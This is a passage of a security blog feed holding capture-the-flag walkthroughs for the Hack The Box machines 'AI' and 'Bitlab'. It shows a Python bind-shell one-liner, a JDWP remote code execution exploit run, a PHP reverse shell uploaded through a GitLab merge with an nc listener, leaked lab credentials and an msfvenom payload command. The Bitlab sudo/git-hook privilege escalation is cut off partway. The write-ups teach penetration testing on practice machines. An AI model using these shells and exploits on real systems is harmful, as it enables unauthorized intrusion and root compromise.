				<pre><code class="language-console" data-lang="console">msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
				</code></pre>
				]]>
			</content>
		</item>
		<item>
			<title>
				Hack The Box - AI
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2020/02/hack-the-box-ai/
			</link>
			<pubDate>
				Fri, 07 Feb 2020 00:00:00 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2020/02/hack-the-box-ai/
			</guid>
			<description>
				Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
				This was a box where for the foothold, you needed to upload a .
			</description>
			<content type="html">
				<![CDATA[
				<img src="/images/htb/ai/info-card.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="quick-summary">Quick Summary</h2>
				<p>Finally, I&rsquo;m posting the walk-through of this box, currently, I&rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D.
				At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.</p>
				<p>This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html">JWDP</a>, the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different <a href="https://en.wikipedia.org/wiki/Speech_synthesis">TTS</a> I didn&rsquo;t like it, in summary, was a box I didn&rsquo;t feel like learning something new at all.</p>
				<p>Said that, time to get our hands dirty.</p>
				<h2 id="nmap">Nmap</h2>
				<p>As always the enumeration starts by running Nmap:</p>
				<pre><code class="language-console" data-lang="console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
				Nmap scan report for ai.htb (10.10.10.163)
				Host is up (0.019s latency).
				Not shown: 998 closed ports
				PORT   STATE SERVICE VERSION
				22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
				| ssh-hostkey:
				|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
				|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
				|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
				80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
				|_http-server-header: Apache/2.4.29 (Ubuntu)
				|_http-title: Hello AI!
				No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
				TCP/IP fingerprint:
				OS:SCAN(V=7.80%E=4%D=12/11%OT=22%CT=1%CU=38328%PV=Y%DS=2%DC=I%G=Y%TM=5DF152
				OS:AE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SE
				OS:Q(SP=108%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
				OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2
				OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNS
				OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
				OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
				OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
				OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
				OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
				
				Network Distance: 2 hops
				Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
				
				OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
				# Nmap done at Wed Dec 11 15:33:50 2019 -- 1 IP address (1 host up) scanned in 20.74 seconds
				</code></pre><p>Which discovers SSH and HTTP (Apache 2.4.29 as the server) open.</p>
				<h2 id="web-enumeration">Web enumeration</h2>
				<p>The home page just shows &ldquo;Artificial Intelligence&rdquo; and has some interactive menus, in one of them, is announced about an AI the company is developing, which can identify what&rsquo;s being told in it, so is possible to upload a file to server, this is already a way to go as is possible to upload a reverse shell.
				Some enumeration of it is carried.</p>
				
				<img src="/images/htb/ai/1.1-web.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/ai/1.1-web-php-1.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/ai/1.1-web-php-2.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/ai/1.1-web-php-3.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>Is given a try to create a .wav file from text (text -&gt; .mp3 -&gt; .wav), upload it and see what happens, the result is an exception which gives a hint: there is access to a mysql database, which means will be possible to do an sql injection.</p>
				
				<img src="/images/htb/ai/1.1-web-rce-1.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/ai/1.1-web-rce-2.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="foothold">Foothold</h2>
				<p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster
				===============================================================
				Gobuster v3.0.1
				by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
				===============================================================
				[+] Url:            http://10.10.10.163
				[+] Threads:        10
				[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
				[+] Status codes:   200,204,301,302,307,401,403
				[+] User Agent:     gobuster/3.0.1
				[+] Extensions:     php
				[+] Timeout:        10s
				===============================================================
				2020/02/07 15:23:07 Starting gobuster
				===============================================================
				/images (Status: 301)
				/index.php (Status: 200)
				/contact.php (Status: 200)
				/about.php (Status: 200)
				/uploads (Status: 301)
				/db.php (Status: 200)
				/intelligence.php (Status: 200)
				/ai.php (Status: 200)
				===============================================================
				2020/02/07 15:48:32 Finished
				===============================================================
				</code></pre><p>As is possible to see above, <code>intelligence.php</code> was discovered, once that page is accessed, is found a guide on how to write some queries to the AI:</p>
				
				<img src="/images/htb/ai/2.1-rce-2.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>After a LOT of try-error (literally, I was never able to go beyond this if it wasn&rsquo;t for the help of <a href="https://www.hackthebox.eu/profile/10423">Interep</a> of both queries and different TTS (being I&rsquo;m not a native english speaker and neither I have a microphone), was used in the end <a href="https://www.text2speech.org/">Text 2 Speech</a>:</p>
				
				<img src="/images/htb/ai/t2s.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>getting as final SQL Injection the next:</p>
				<pre><code>User:
				Open single quote union select, username from users Comment Database
				Password:
				Open single quote union select, password from users Comment Database
				</code></pre><p>Once it&rsquo;s respective .wav files generate by the TTS mentioned above were uploaded, the following were the results:</p>
				
				<img src="/images/htb/ai/command-ok-1.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/ai/command-ok-2.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>Then, was tried to login via ssh with the credentials:</p>
				<pre><code>user: alexa
				passwd: H,Sq9t6}a&lt;)?q93_
				</code></pre><p>Getting a success:</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
				alexa@10.10.10.163's password:
				Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
				
				* Documentation:  https://help.ubuntu.com
				* Management:     https://landscape.canonical.com
				* Support:        https://ubuntu.com/advantage
				
				System information as of Fri Feb  7 20:27:47 UTC 2020
				
				System load:  0.14               Processes:           162
				Usage of /:   28.0% of 19.56GB   Users logged in:     1
				Memory usage: 27%                IP address for eth0: 10.10.10.163
				Swap usage:   0%
				
				
				* Canonical Livepatch is available for installation.
				- Reduce system reboots and improve kernel security. Activate at:
				https://ubuntu.com/livepatch
				
				63 packages can be updated.
				15 updates are security updates.
				
				Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
				
				
				Last login: Fri Feb  7 20:14:41 2020 from 10.10.14.29
				alexa@AI:~$ wc -c user.txt
				33 user.txt
				</code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
				<p>When is checked which net. services are listening, was found :8080:</p>
				<pre><code class="language-console" data-lang="console">alexa@AI:~$ ss -punta
				Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
				:Port
				udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
				:*
				udp                 UNCONN                   0                     0                                                  0.0.0.0:5353                                             0.0.0.0
				:*
				udp                 UNCONN                   0                     0                                                  0.0.0.0:53210                                            0.0.0.0
				:*
				udp                 UNCONN                   0                     0                                                     [::]:5353                                                [::]
				:*
				udp                 UNCONN                   0                     0                                                     [::]:55175                                               [::]
				:*
				tcp                 LISTEN                   0                     1                                                127.0.0.1:8000                                             0.0.0.0:*
				tcp                 LISTEN                   0                     80                                               127.0.0.1:3306                                             0.0.0.0:*
				tcp                 LISTEN                   0                     128                                          127.0.0.53%lo:53                                               0.0.0.0:*
				tcp                 LISTEN                   0                     128                                                0.0.0.0:22                                               0.0.0.0:*
				tcp                 ESTAB                    0                     0                                             10.10.10.163:22                                           10.10.14.29:58570
				tcp                 ESTAB                    0                     36                                            10.10.10.163:22                                           10.10.14.29:54700
				tcp                 LISTEN                   0                     1                                       [::ffff:127.0.0.1]:8005                                                   *:*
				tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8009                                                   *:*
				tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8080                                                   *:*
				tcp                 LISTEN                   0                     128                                                      *:80                                                     *:*
				tcp                 LISTEN                   0                     128                                                   [::]:22                                                  [::]:*
				tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883
				</code></pre><p>then an ssh tunnel with <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> was run to know which service it was, resulting in tomcat:</p>
				
				<img src="/images/htb/ai/tomcat-tunnel.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html">JDWP</a> enabled:</p>
				<pre><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
				</code></pre><p>A quick search google gives a result the next <a href="https://www.exploit-db.com/exploits/46501">exploit</a></p>
				<p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
				</code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>
				<pre><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh
				[+] Targeting '127.0.0.1:8000'
				[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
				[+] Found Runtime class: id=650
				[+] Found Runtime.getRuntime(): id=7f9080006b60
				[+] Created break event id=2
				[+] Waiting for an event on 'java.lang.String.indexOf'
				[+] Received matching event from thread 0x6ed
				[+] Selected payload '/tmp/bind.sh'
				[+] Command string object created id:6ee
				[+] Runtime.getRuntime() returned context id:0x6ef
				[+] found Runtime.exec(): id=7f9080006b98
				[+] Runtime.exec() successful, retId=6f0
				[!] Command successfully executed
				</code></pre><p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
				ai.lnx.htb [10.10.10.163] 2222 (?) open
				bash: cannot set terminal process group (6086): Inappropriate ioctl for device
				bash: no job control in this shell
				root@AI:~# wc -c /root/root.txt
				wc -c /root/root.txt
				33 /root/root.txt
				</code></pre><p>Done, we have root access and the root.txt flag :D.</p>
				<p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p>
				]]>
			</content>
		</item>
		<item>
			<title>
				Hack The Box - Bitlab
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2020/01/hack-the-box-bitlab/
			</link>
			<pubDate>
				Sat, 11 Jan 2020 00:00:00 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2020/01/hack-the-box-bitlab/
			</guid>
			<description>
				Quick Summary First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the sudo + git path as I&amp;rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.
			</description>
			<content type="html">
				<![CDATA[
				<img src="/images/htb/bitlab/info-card.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="quick-summary">Quick Summary</h2>
				<p>First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the <code>sudo + git</code> path as I&rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</p>
				<p>This was a cool box, not hard at the technical level, but one that required to enumerate a lot, so pretty cool to get better at that!</p>
				<p>Said that, let&rsquo;s get our hands dirty :D</p>
				<h2 id="nmap">Nmap</h2>
				<p>We start running nmap to get which ports/services are being exposed:</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
				Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
				Nmap scan report for bitlab.htb (10.10.10.114)
				Host is up (0.019s latency).
				Not shown: 998 filtered ports
				PORT   STATE SERVICE VERSION
				22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
				| ssh-hostkey:
				|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
				|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
				|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
				80/tcp open  http    nginx
				| http-robots.txt: 55 disallowed entries (15 shown)
				| / /autocomplete/users /search /api /admin /profile
				| /dashboard /projects/new /groups/new /groups/*/edit /users /help
				|_/s/ /snippets/new /snippets/*/edit
				| http-title: Sign in \xC2\xB7 GitLab
				|_Requested resource was http://bitlab.htb/users/sign_in
				|_http-trane-info: Problem with XML parsing of /evox/about
				Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
				Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
				No exact OS matches for host (test conditions non-ideal).
				Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
				
				OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
				# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
				</code></pre><p>And we get SSH (22) and HTTP (80) are open + that the web service which is running on port 80 is <a href="https://gitlab.com/">Gitlab</a>.</p>
				<h2 id="web-enumeration">Web enumeration</h2>
				<p>The home page (<code>http://10.10.10.114/</code>), is just the standard login page which bitlab has:</p>
				
				<img src="/images/htb/bitlab/1.1-web_enum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>We try the links in this page and check if they are working, with it we found <code>Help</code> it is, and we are redirected to a directory listing having a <code>bookmarks.html</code> and open it:</p>
				
				<img src="/images/htb/bitlab/1.2-web_enum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/bitlab/1.3-web_enum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>We notice that <code>Gitlab Login</code> is an obfuscated js code, we jump into deobfuscate it (I used <a href="https://lelinhtinh.github.io/de4js/">de4js</a> but any deobfuscation tool or even a python console will do it):</p>
				<p>From the code:</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span>(<span style="color:#66d9ef">function</span>(){ <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4b18</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style="color:#e6db74">&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style="color:#e6db74">&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style="color:#e6db74">&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">3</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">5</span>]; })()
				</code></pre></div><p>We get the following code:</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span> (<span style="color:#66d9ef">function</span> () {
				<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4b18</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;value&#34;</span>, <span style="color:#e6db74">&#34;user_login&#34;</span>, <span style="color:#e6db74">&#34;getElementById&#34;</span>, <span style="color:#e6db74">&#34;clave&#34;</span>, <span style="color:#e6db74">&#34;user_password&#34;</span>, <span style="color:#e6db74">&#34;11des0081x&#34;</span>];
				document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">3</span>];
				document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">5</span>];
				})()
				</code></pre></div><p>With that we get credentials we could try into the login, an user called <code>clave</code> and a password <code>11des0081x</code>, after we try to login with those credentials we are loged and have access to some projects:</p>
				
				<img src="/images/htb/bitlab/1.5-web_enum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>Taking a deepest look into <code>Profile</code> we find that this project has <a href="https://docs.gitlab.com/ee/topics/autodevops/">Auto DevOps</a> enabled.
				We continue enumerating a bit more, and see that the project called <code>Deployer</code> is in charge to manage to do that: deploy the applications, in the description is given a link pointing to the we take a look into the documentation of <a href="https://docs.gitlab.com/ee/user/project/integrations/webhooks.html">webhooks</a> gitlab has, after it we take a look into <code>index.php</code> to see what it does:</p>
				
				<img src="/images/htb/bitlab/1.6-web_enum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/bitlab/1.7-web_enum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
				
				$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
				$payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);
				
				$repo <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">project</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
				$event <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">event_type</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
				$state <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">state</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
				$branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">target_branch</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
				
				<span style="color:#66d9ef">if</span> ($repo<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;Profile&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $branch<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;master&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $event<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merge_request&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $state<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merged&#39;</span>) {
				<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cd ../profile/; sudo git pull&#39;</span>),<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
				}
				
				<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
				</code></pre></div><p>Tying together the pieces we have at this point, we can figure out the foothold: we need to upload a php reverse shell, having it merged to master (the code of <code>index.php</code> specifies git pull will being executed basically if there was a merge to master), once that is done, a webhook will execute <code>index.php</code> from <code>Deployer</code> with this we will have our reverse shell uploaded to server.</p>
				<h2 id="rce---www-data---root">RCE -&gt; www-data -&gt; root</h2>
				<p>We upload the next <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php reverse shell by pentestmonkey</a> changing <code>$ip = '127.0.0.1'</code> and <code>$port = 1234</code> to our ip and the port we will be listening in our machine, afterwards we merge it (we will be automatically redirected to the page for merging it).</p>
				<p>Now, the reverse shell is uploaded, but we still need to execute it, for that is needed to know which one is the path to execute it, if we remember the project <code>Deployer</code> has it&rsquo;s index.php which will print an &ldquo;OK&rdquo; we could try to access the path of deployer and see if it is printed, if it is, then we know that the path for our reverse shell will be <code>http://10.0.0.14/profile/&lt;name of our reverse shell&gt;</code>:</p>
				
				<img src="/images/htb/bitlab/1.rce.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>Now we know that indeed that the mentioned url above will be the one wee need to use.
				We run the listener for our reverse shell and execute it, with it having our rce:</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
				listening on [any] 1234 ...
				connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
				Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
				19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
				USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
				uid=33(www-data) gid=33(www-data) groups=33(www-data)
				/bin/sh: 0: can't access tty; job control turned off
				$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
				www-data@bitlab:/var/www$ pwd
				pwd
				/var/www
				</code></pre><p>We check if we have sudo rights, where is the home of www-data and what we found there:</p>
				<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www$ sudo -l
				sudo -l
				Matching Defaults entries for www-data on bitlab:
				env_reset, exempt_group=sudo, mail_badpass,
				secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
				
				User www-data may run the following commands on bitlab:
				(root) NOPASSWD: /usr/bin/git pull
				www-data@bitlab:/var/www$ getent passwd www-data
				getent passwd www-data
				www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
				www-data@bitlab:/tmp/profile$ cd /var/www/html/profile
				cd /var/www/html/profile
				www-data@bitlab:/var/www/html/profile$ ls -la
				ls -la
				total 144
				drwxr-xr-x 3 root root  4096 Jan 10 19:56 .
				drwxr-xr-x 5 root root  4096 Jul 30 12:37 ..
				drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
				-rw-r--r-- 1 root root    42 Feb 26  2019 .htaccess
				-rw-r--r-- 1 root root   110 Jan  4  2019 README.md
				-rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
				-rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
				-rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php
				</code></pre><p>So far we know that the repos of git are under <code>/var/www/html/</code> and that we are allowed to do a git pull with sudo rights inside the repos, this is what we will be using to get root by taking advantage of the webhooks enabled in gitlab (post-merge hook) and the ability to run git pull with root rights (<code>git pull</code> is like git fetch and git merge in one for saying it in a way), for understanding how these 2 things work, jump into the documentation of <a href="https://git-scm.com/docs/githooks#_post_merge">hooks: post merge</a> and the one for <a href="https://git-scm.com/docs/git-pull">git pull</a>.</p>
				<p>Our repo doesn&rsquo;t allow us to edit files there, so we copy the repo to a place where we have them:</p>
				<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
				cp -r profile /tmp/profile
				www-data@bitlab:/tmp/profile$ ls -la
				ls -la
				total 148
				drwxr-xr-x 4 www-data www-data  4096 Jan 10 20:08 .
				drwxrwxrwt 3 root     root      4096 Jan 10 20:03 ..
				drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
				-rw-r--r-- 1 www-data www-data    42 Jan 10 20:03 .htaccess
				-rw-r--r-- 1 www-data www-data   110 Jan 10 20:03 README.md
				-rw-r--r-- 1 www-data www-data 93029 Jan 10 20:03 developer.jpg
